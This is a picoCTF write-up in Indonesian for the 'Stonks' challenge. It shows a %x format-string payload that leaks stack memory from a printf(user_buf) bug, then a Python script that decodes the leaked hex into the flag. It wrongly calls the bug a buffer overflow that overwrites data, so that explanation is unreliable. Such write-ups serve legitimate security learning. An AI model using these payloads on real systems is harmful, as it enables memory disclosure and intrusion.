# Stonks

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/62f47b5b65ec7eadb96c4e34f016f68d/vuln.c) `nc mercury.picoctf.net 53437`

## Hints
Okay, maybe I'd believe you if you find my API key.

## Solving
lihat ke **vuln.c** disana ada baris yang berisi
>printf(user_buf);

itu kita bisa exploit menggunakan anomali "buffer_overflow" dengan memasukkan input di bawah ini,
pertama kita masuk ke terminal ketikkan:
>nc mercury.picoctf.net 53437

masukkan input seperti dibawah ini
![](CTF/PicoCTF-Penyelesaian/lainnya/008.%20Stonks%20(SOLVED)/Screenshot%20from%202021-12-09%2021-25-36.png)
lalu masukkan kode buffernya:
```
x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%xx%x%x%x%x%
```

>ini akan menimpa data yang berdekatan dan menyebabkan data itu terlihat di terminal kita.

data yang terlihat dari exploitasi tersebut:
```
x8f9b3f0804b00080489c3f7f6bd80ffffffff18f99160f7f79110f7f6bdc708f9a18028f9b3d08f9b3f06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3463646261653532ff96007df7fa6af8f7f79440cc1d6100
```

konversikan dari hex ke ascii di https://www.rapidtables.com/convert/number/hex-to-ascii.html
akan ketemu baris seperti ini
>ocip{FTC0l_I4_t5m_ll0m_y_y3n4cdbae52ÿ}

kode ini diacak jadi kita harus memecahkannya terlebihdahulu, bisa dengan cara manual atau bisa juga dengan menggunakan bahasa pemrograman, di sini saya menggunakan python untuk men-decode baris di atas.

buat program python untuk decoder
```
s='ocip{FTC0l_I4_t5m_ll0m_y_y3n4cdbae52ÿ}'

from contextlib import suppress

print()

for x in range(0,len(s),4):

	with suppress(Exception):

		print(s[x+3],end="")

	with suppress(Exception):

		print(s[x+2],end="")

	with suppress(Exception):

		print(s[x+1],end="")

	with suppress(Exception):

		print(s[x],end="")

  

print("\n")
```
jalankan akan ketemu kode
>picoCTF{I_l05t_4ll_my_m0n3y_......}
## Flag
picoCTF{I_l05t_4ll_my_m0n3y_............}

## Referensi
https://www.youtube.com/watch?v=ctpQdH-GGqY
https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Binary%20Exploitation/Stonks/Stonks.md
https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Binary%20Exploitation/Stonks/script.py